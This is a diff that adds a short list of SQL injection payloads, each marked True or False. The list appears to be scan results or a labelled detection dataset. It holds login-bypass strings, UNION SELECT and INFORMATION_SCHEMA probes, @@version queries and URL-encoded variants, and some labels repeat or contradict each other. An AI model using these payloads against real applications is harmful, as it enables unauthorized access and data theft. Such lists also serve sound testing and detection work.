@@ -1,0 +1,33 @@
+'||(elt(-3+5,bin(15),ord(10),hex(char(45)))) - True
+||6 - False
+'||'6 - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - False
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - False
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - False
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
